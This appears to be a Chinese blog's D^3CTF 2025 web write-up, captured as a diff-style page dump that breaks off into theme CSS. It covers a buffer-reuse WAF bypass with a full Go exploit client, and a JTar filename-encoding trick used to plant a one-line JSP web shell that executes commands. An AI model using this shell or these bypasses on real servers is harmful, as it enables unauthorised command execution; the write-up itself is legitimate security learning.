-<p>题目给了附件，是用 go 搭建的 http3 服务器，并且有使用证书。直接使用附件中给出的证书会报错，所以在编写客户端代码的时候一定要这样来跳过证书校验：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ========== 2. 构造一个支持 HTTP/3 的 http.Client ==========</span><br><span class="line">	rt := &amp;http3.RoundTripper&#123;</span><br><span class="line">		TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">			RootCAs:            certPool,</span><br><span class="line">			InsecureSkipVerify: true, // 跳过证书校验（只用于测试）</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从题目代码可知，如果读到的请求体为 “I want flag” 则会弹出 flag ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601195629-5yv6st6.png">
-
-<p>直接发送会被 waf 拦截：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601202047-bk1evku.png">
-
-<h3 id="缓冲区重用"><a href="#缓冲区重用" class="headerlink" title="缓冲区重用"></a>缓冲区重用</h3><p>下面我们来细看一下 waf 的运作原理。</p>
-<p>首先，程序读取 Content-Length 头：</p>
-<p>如果没有设置 Content-Length 头（默认 -1），则将请求体 r.Body 一次性读完，并且在读取过程中用 textInterrupterWrap 检查请求体；</p>
-<p>如果设置了 Content-Length 头，则根据 length 为其分配相等大小的缓冲区 buf ，先将请求体存入 buf ，然后再调用 textInterrupterWrap 进行检查：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">var buf []byte</span><br><span class="line">	length := int(r.ContentLength)</span><br><span class="line">	if length == -1 &#123;</span><br><span class="line">		var err error</span><br><span class="line">		buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			if errors.Is(err, ErrWAF) &#123;</span><br><span class="line">				w.WriteHeader(400)</span><br><span class="line">				_, _ = w.Write([]byte(&quot;WAF&quot;))</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				w.WriteHeader(500)</span><br><span class="line">				_, _ = w.Write([]byte(&quot;error&quot;))</span><br><span class="line">			&#125;</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		buf = p.Get(length)</span><br><span class="line">		defer p.Put(buf)</span><br><span class="line">		rd := textInterrupterWrap(r.Body)</span><br><span class="line">		i := 0</span><br><span class="line">		for &#123;</span><br><span class="line">			n, err := rd.Read(buf[i:])</span><br><span class="line">			if err != nil &#123;</span><br><span class="line">				if errors.Is(err, io.EOF) &#123;</span><br><span class="line">					break</span><br><span class="line">				&#125; else if errors.Is(err, ErrWAF) &#123;</span><br><span class="line">					w.WriteHeader(400)</span><br><span class="line">					_, _ = w.Write([]byte(&quot;WAF&quot;))</span><br><span class="line">					return</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					w.WriteHeader(500)</span><br><span class="line">					_, _ = w.Write([]byte(&quot;error&quot;))</span><br><span class="line">					return</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			i += n</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>textInterrupterWrap 就是检查请求体中是否包含 “flag” ，如果包含就会报错：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601204949-xk8c7mh.png">
-
-<p>那么利用思路就能够想到了：先发送一个 “I want flag” ，并且带上 Content-Length 头为 11 。</p>
-<p>这样其会把这个字符串存入的缓存 buf 中，就算被 waf 了也没关系，我们的 “I want flag” 已经存在了 buf 中。</p>
-<p>随后发送下一个请求，比如这次的请求体只发送一个 “I” ，Content-Length 头仍然设置为 11 ，这个 “I” ，并不包含 “flag” 字符串，可以绕过 waf 。这个 “I” 会被加入到 buf 中，覆盖原来的第一个字符，构成的还是 “I want flag” 。于是拿到 flag 。</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;crypto/tls&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;io&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line"></span><br><span class="line">	http3 &quot;github.com/quic-go/quic-go/http3&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 构造一个支持 HTTP/3 的客户端，跳过证书校验（仅测试用）</span><br><span class="line">	rt := &amp;http3.RoundTripper&#123;</span><br><span class="line">		TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">			InsecureSkipVerify: true,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	defer rt.Close()</span><br><span class="line">	client := &amp;http.Client&#123;Transport: rt&#125;</span><br><span class="line"></span><br><span class="line">	// ---------------------------</span><br><span class="line">	// 第一次请求：发送 &quot;I want flag&quot;，长度 11</span><br><span class="line">	// ---------------------------</span><br><span class="line">	bodyBytes := []byte(&quot;I want flag&quot;) // 长度为 11</span><br><span class="line">	bodyReader := bytes.NewReader(bodyBytes)</span><br><span class="line"></span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, &quot;https://35.241.98.126:30226/&quot;, bodyReader)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;第一次 NewRequest 失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)</span><br><span class="line">	req.ContentLength = 11 // 11</span><br><span class="line"></span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;第一次请求失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	respData, err := io.ReadAll(resp.Body)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;读取第一次响应失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(&quot;第一次请求 状态码：%d\n&quot;, resp.StatusCode)</span><br><span class="line">	fmt.Printf(&quot;第一次请求 响应 Body:\n%s\n&quot;, string(respData))</span><br><span class="line"></span><br><span class="line">	// ---------------------------</span><br><span class="line">	// 第一次请求：发送 &quot;I&quot;，长度 11</span><br><span class="line">	// ---------------------------</span><br><span class="line"></span><br><span class="line">	emptyPadding := []byte(&quot;I&quot;)</span><br><span class="line">	bodyReader2 := bytes.NewReader(emptyPadding)</span><br><span class="line"></span><br><span class="line">	req2, err := http.NewRequest(&quot;POST&quot;, &quot;https://35.241.98.126:30226/&quot;, bodyReader2)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;第二次 NewRequest 失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	req2.Header.Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)</span><br><span class="line">	req2.ContentLength = 11</span><br><span class="line"></span><br><span class="line">	resp2, err := client.Do(req2)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;第二次请求失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	defer resp2.Body.Close()</span><br><span class="line"></span><br><span class="line">	respData2, err := io.ReadAll(resp2.Body)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;读取第二次响应失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(&quot;第二次请求 状态码：%d\n&quot;, resp2.StatusCode)</span><br><span class="line">	fmt.Printf(&quot;第二次请求 响应 Body:\n%s\n&quot;, string(respData2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>拿到 flag ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602003509-l8n9001.png">
-
-<h2 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h2><p>这道题给了附件，题目有三个接口。</p>
-<p>&#x2F;view 用来查看 &#x2F;WEB-INF&#x2F;views&#x2F; 目录下后缀为 .jsp 的文件，参数 page 被限制为只能输入字母数字：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602003958-e61o42b.png">
-
-<p>&#x2F;Upload 用来上传文件，上传的路径为 webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;views ，其中有文件后缀黑名单：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602004108-ga19z68.png">
-
-<p>secureUpload 被调用：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602004446-y5una90.png">
-
-<p>其中除了文件后缀黑名单之外还有对文件名的过滤：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602004544-agv9iwt.png">
-
-<p>以及将文件名随机化处理：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602004626-554081h.png">
-
-<p>&#x2F;BackUp 用来压缩和解压缩，压缩时传入 op&#x3D;tar ，会将 webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;views&#x2F; 目录下的所有文件压缩成 backup.tar，解压缩时传入 op&#x3D;untar ，会将 webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;views&#x2F;backup.tar 解压缩：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602004712-ksz2e12.png">
-
-<p>综上，整理思路。</p>
-<p>1、可控的只有文件后缀名和文件内容</p>
-<p>2、由于上传的文件名会被随机化，要想得到 backup.tar 文件，只能通过调用压缩接口。</p>
-<p>3、由于 &#x2F;view 接口只能读取后缀为 .jsp 的文件，并且也被限死为字母数字，于是推测解压后的文件后缀一定是 .jsp ，否则无法读取。</p>
-<p>4、由于上传文件有后缀黑名单，故不可能直接上传 .jsp 文件。那么可能是上传某个后缀名经过压缩和解压缩变换之后得到了 .jsp 后缀名。</p>
-<p>基于以上思路，在不断的尝试下，发现如果后缀名为中文，经过压缩解压缩后会变为乱码：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602011409-mrruvec.png">
-
-<p>压缩解压缩后：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602011346-za6en5n.png">
-
-<p>记得在上传其他类型的后缀时要把 Content-Type 改为 application&#x2F;octet-stream ，源码有校验：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602010218-tvnb2xz.png">
-
-<p>于是立刻想到，有没有一种中文，可以让其在压缩解压缩后变为 jsp ？</p>
-<p>下面研究一下 测 和 K 的关系，先看他们的 unicode 编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测：\u6d4b</span><br><span class="line">K: \u004b</span><br></pre></td></tr></table></figure>
-
-<p>发现低位相同，高位由 6d -&gt; 00 。测试其他汉字，发现结果也是一样。</p>
-<p>于是我们以同样的思路得到 jsp 对应的中文：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jsp: \u006a\u0073\u0070</span><br><span class="line">浪浳浰: \u6d6a\u6d73\u6d70</span><br></pre></td></tr></table></figure>
-
-<p>最终得到这个中文为 浪浳浰 。以 浪浳浰 为后缀，压缩解压缩后会变成 jsp ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602012559-ius1z3z.png">
-
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602012541-o3d0wd5.png">
-
-<p>既然如此，我们就可以直接往文件内容写马，随便找个 jsp 马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; %&gt;</span><br></pre></td></tr></table></figure>
-
-<p>直接来测远程环境：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602012933-4b97hdy.png">
-
-<p>记住这个文件名，调用完压缩解压缩接口以后就可以直接访问这个马了：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250602014129-rl3fyui.png">
-
-<p>拿到 flag 。</p>
-<h3 id="JTar-中文解压乱码"><a href="#JTar-中文解压乱码" class="headerlink" title="JTar 中文解压乱码"></a>JTar 中文解压乱码</h3><p>事后分析原因，大致如下：</p>
-<p>JTar 默认用的是 ISO-8859-1（Latin-1）来写入和读取 .tar 条目名称，因此如果文件名中包含 UTF-8&#x2F;GBK 编码的中文，就会出现乱码。</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://github.com/kamranzafar/jtar/pull/36">https://github.com/kamranzafar/jtar/pull/36</a></p>
-<p>‍</p>
-<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/">晨曦</a>、<a target="_blank" rel="noopener" href="https://bowuchuling.github.io/">薄雾初零</a>、<a target="_blank" rel="noopener" href="http://www.chleynx.cn/">chleynx</a>、以及其他 NK 师傅</p>
-<p>NK wp ：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247487535&idx=1&sn=696b5d46349c89790465faf8c623773c&chksm=ced0f683077e0967bd6359df964a50cac1cc0e1fd0f889f08ec0d6286159496f1676f016f113&mpshare=1&scene=22&srcid=0602tdAaexRI7qZG3d5HMXQZ&sharer_shareinfo=54df084f2189fc3b2fa2c52a279940b3&sharer_shareinfo_first=2854f791555adfe0b1b78c9cfaf6a64d#rd">D^3 CTF2025 WriteUp By N0wayBack</a></p>
-<p>‍官方 wp ：<a target="_blank" rel="noopener" href="https://github.com/D-3CTF/D3CTF-2025-Official-Writeup/tree/main">D3CTF-2025-Official-Writeup</a></p>
-
-
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">漏洞篇 - SnakeYaml 反序列化</a></div></section></div>
-
-
-
-
-
-
-<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
-</div></footer>
-<div class='float-panel mobile-only blur' style='display:none'>
-  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
-  </button>
-</div>
-<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
-<script type="text/javascript">
-  const stellar = {
-    // 懒加载 css https://github.com/filamentgroup/loadCSS
-    loadCSS: (href, before, media, attributes) => {
-      var doc = window.document;
-      var ss = doc.createElement("link");
-      var ref;
-      if (before) {
-        ref = before;
-      } else {
-        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
-        ref = refs[refs.length - 1];
-      }
-      var sheets = doc.styleSheets;
-      if (attributes) {
-        for (var attributeName in attributes) {
-          if (attributes.hasOwnProperty(attributeName)) {
-            ss.setAttribute(attributeName, attributes[attributeName]);
-          }
-        }
-      }
-      ss.rel = "stylesheet";
-      ss.href = href;
-      ss.media = "only x";
-      function ready(cb) {
-        if (doc.body) {
-          return cb();
-        }
-        setTimeout(function () {
-          ready(cb);
-        });
-      }
-      ready(function () {
-        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
-      });
-      var onloadcssdefined = function (cb) {
-        var resolvedHref = ss.href;
-        var i = sheets.length;
-        while (i--) {
-          if (sheets[i].href === resolvedHref) {
-            return cb();
-          }
-        }
-        setTimeout(function () {
-          onloadcssdefined(cb);
-        });
-      };
-      function loadCB() {
-        if (ss.addEventListener) {
-          ss.removeEventListener("load", loadCB);
-        }
-        ss.media = media || "all";
-      }
-      if (ss.addEventListener) {
-        ss.addEventListener("load", loadCB);
-      }
-      ss.onloadcssdefined = onloadcssdefined;
-      onloadcssdefined(loadCB);
-      return ss;
-    },
-
-    // 从 butterfly 和 volantis 获得灵感
-    loadScript: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
-      if (src.startsWith('/')){
-        src = stellar.config.root + src.substring(1);
-      }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
-        }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
-
-    // https://github.com/jerryc127/hexo-theme-butterfly
-    jQuery: (fn) => {
-      if (typeof jQuery === 'undefined') {
-        stellar.loadScript(stellar.plugins.jQuery).then(fn)
-      } else {
-        fn()
-      }
-    }
-  };
-  stellar.version = '1.26.8';
-  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
-  stellar.config = {
-    date_suffix: {
-      just: '刚刚',
-      min: '分钟前',
-      hour: '小时前',
-      day: '天前',
-      month: '个月前',
-    },
-    root : '/',
-  };
-
-  // required plugins (only load if needs)
-  stellar.plugins = {
-    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
-  };
-
-  if ('local_search') {
-    stellar.search = {};
-    stellar.search.service = 'local_search';
-    if (stellar.search.service == 'local_search') {
-      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
-      stellar.search[stellar.search.service] = service_obj;
-    }
+.l_body {
+  display: flex;
+  margin: auto;
+  padding: 0 var(--gap-l);
+  justify-content: center;
+  font-size: var(--fsp);
+}
+.l_body .l_left {
+  z-index: 8;
+  width: var(--width-left);
+  flex-shrink: 0;
+  position: sticky;
+  position: -webkit-sticky;
+  top: 8px;
+}
+.l_body .l_main {
+  flex-shrink: 1;
+  flex-grow: 1;
+  width: 320px;
+  max-width: var(--width-main);
+}
+.main-mask {
+  position: fixed;
+  pointer-events: none;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.2);
+  z-index: 9;
+  opacity: 0;
+  trans1: opacity;
+}
+@media screen and (max-width: $device-mobile-max) {
+  .mobile-only {
+    display: block !important;
   }
-
-  // stellar js
-  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
-
-  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
-  // optional plugins
-  if ('true' == 'true') {
-    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  .l_body {
+    padding: 0;
   }
-  if ('true' == 'true') {
